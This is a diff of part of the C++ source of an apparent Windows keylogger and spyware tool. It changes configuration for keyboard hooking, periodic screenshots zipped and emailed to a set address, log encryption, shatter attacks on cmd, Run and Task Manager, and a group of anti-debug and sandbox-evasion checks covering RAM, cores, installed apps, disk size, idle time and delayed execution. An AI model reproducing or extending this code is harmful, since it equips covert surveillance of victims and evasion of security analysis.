@@ -27,34 +27,39 @@
 #include <intrin.h>
 #include <array>
 #include <winioctl.h>
+#include <shlwapi.h>
 
 #include "Antidbg.h"
 #include "log.h"
+#include "base64.h"
 
 using buffer = std::vector<char>;
 
 //------------------------------------------------------
 // Customization
 
-#define debug               //whether or not to crypt files and shatter-attack system utilities
-
-#define CharactersPerLog 300
+#define CryptLogs false     //whether or not to crypt files and shatter-attack system utilities [REMOVE THIS FLAG]
+#define KeyShiftLimit 1223  //cap for the highest possible random encryption key
+#define ShatterAttack false //disable or enable shatter attacks on sys utils(cmd,Run,Taskmgmr)
+#define IsMajor false       //let the program know whether its a Dev build or not
+#define CurrentVersion "1.6"//current version number
+#define GitVersionLink "https://raw.githubusercontent.com/brat-volk/MagikIndex/main/MagikVersion.inf"//link to GitHub Raw server containing up-to-date version file
+#define CharactersPerLog 300//
 #define MaximumFolderSize 10 
-#define RequiredRam 2048    //MB
-#define RequiredCores 2 
-#define CryptPassword "MyPassword" 
-#define BaseShiftValue 100  //base int to add to chars for crypting measures
+#define RequiredRam 2048    //MB                                             (anti-dbg feature)
+#define RequiredCores 2     //                                               (anti-dbg feature)
 #define SecondsBetweenScreenshots 20
 #define ScreenshotsPerZip 4
 #define SendersEmail ""
-#define SendersPsw ""
+#define SendersPsw "
 #define RecieversEmail ""
-#define MaxInactivity 10    //max amount of seconds since last input
-#define MinRequiredApps 20  //minimum amount of installed programs
-#define SecurityLevel 3     //0-3 levels of trust towards environment
-#define MinHardDisk 60      //minimum size for the main partition
-#define DelayExecution true //whether or not execution should be delayed
-#define DelayTime 120       //amount of time for the delay (seconds)
+#define MaxInactivity 10    //max amount of seconds since last input         (anti-dbg feature)
+#define MinRequiredApps 20  //minimum amount of installed programs           (anti-dbg feature)
+#define SecurityLevel 3     //0-3 levels of trust towards environment        (anti-dbg feature)
+#define MinHardDisk 60      //minimum size for the main partition(GB)        (anti-dbg feature)
+#define DelayExecution true //whether or not execution should be delayed     (anti-dbg feature)
+#define DelayTime 120       //amount of time for the delay (seconds)         (anti-dbg feature)
+#define QuitIfUntrust true  //should we send a log if the environment is untrusted or quit on the spot?
 
 //------------------------------------------------------
 
@@ -73,6 +78,7 @@ using buffer = std::vector<char>;
 #pragma comment(lib, "Slwga.lib")
 #pragma comment( lib, "comsuppw.lib" )
 //#pragma comment(lib, "Wbemuuid.lib.")
+#pragma comment(lib, "urlmon.lib")
 
 
 #define _WIN32_WINNT 0x050
@@ -88,8 +94,8 @@ ULONG WINAPI ScreenGrabber(LPVOID Parameter);
 void TakeScreenShot(const char* filename);
 bool fexists(std::string filename);                          //create native check through CreateFileA()
 void FinalExit();
-LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 //void Compress(const buffer& in, buffer& out);
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 
 
 
